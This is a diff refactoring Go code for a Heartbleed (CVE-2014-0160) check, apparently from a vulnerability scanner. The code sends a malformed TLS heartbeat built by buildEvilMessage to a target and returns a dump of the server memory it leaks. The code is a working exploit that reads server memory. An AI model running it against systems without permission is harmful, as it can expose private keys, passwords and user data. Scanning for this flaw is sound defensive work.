@@ -52,80 +52,75 @@ func buildEvilMessage(payload []byte, host string) []byte {
 	return buf.Bytes()
 }
 
-func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (out []byte, err error) {
+func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (string, error) {
 	host := tgt.HostIp
-
 	if strings.Index(host, ":") == -1 {
 		host = host + ":443"
 	}
+
 	net_conn, err := net.DialTimeout("tcp", host, 3*time.Second)
 	if err != nil {
-		return
+		return "", err
 	}
 	net_conn.SetDeadline(time.Now().Add(9 * time.Second))
 
 	if tgt.Service != "https" {
 		err = DoStartTLS(net_conn, tgt.Service)
 		if err != nil {
-			return
+			return "", err
 		}
 	}
 
 	hname := strings.Split(host, ":")
 	conn := tls.Client(net_conn, &tls.Config{InsecureSkipVerify: skipVerify, ServerName: hname[0]})
+	defer conn.Close()
+
 	err = conn.Handshake()
 	if err != nil {
-		return
+		return "", err
 	}
 
-	var vuln = make(chan bool, 1)
-	buf := new(bytes.Buffer)
-	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload, host)), func(data []byte) {
-		spew.Fdump(buf, data)
-		if bytes.Index(data, padding) == -1 {
-			vuln <- false
-		} else {
-			if strings.Index(string(data), host) == -1 {
-				err = errors.New("Please try again")
-				vuln <- false
-			} else {
-				vuln <- true
-			}
-		}
-	})
+	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload, host)))
 	if err != nil {
-		return
+		return "", err
 	}
 
 	go func() {
 		// Needed to process the incoming heartbeat
 		conn.Read(nil)
-		// spew.Dump(read_err)
 	}()
 
+	res := make(chan error)
 	go func() {
+		// TODO: rewrite this, find a better way to detect server being "alive"
+		// (<joke>maybe send an heartbeat?</joke>)
 		time.Sleep(3 * time.Second)
-		_, err = conn.Write([]byte("quit\n"))
-		conn.Read(nil) // TODO: here we should probably check that it succeeds
-		vuln <- false
+		_, err := conn.Write([]byte("quit\n"))
+		conn.Read(nil)
+		res <- err
 	}()
 
 	select {
-	case status := <-vuln:
-		conn.Close()
-		if status {
-			out = buf.Bytes()
-			return out, nil // VULNERABLE
-		} else if err != nil {
-			return
-		} else {
-			err = Safe
-			return
+	case data := <-conn.Heartbeats:
+		out := spew.Sdump(data)
+		if bytes.Index(data, padding) == -1 {
+			return "", Safe
 		}
+		if strings.Index(string(data), host) == -1 {
+			return "", errors.New("Please try again")
+		}
+
+		// Vulnerable
+		return out, nil
+
+	case r := <-res:
+		if r != nil {
+			return "", r
+		}
+		return "", Safe
+
 	case <-time.After(6 * time.Second):
-		err = Timeout
-		conn.Close()
-		return
+		return "", Timeout
 	}
 
 }
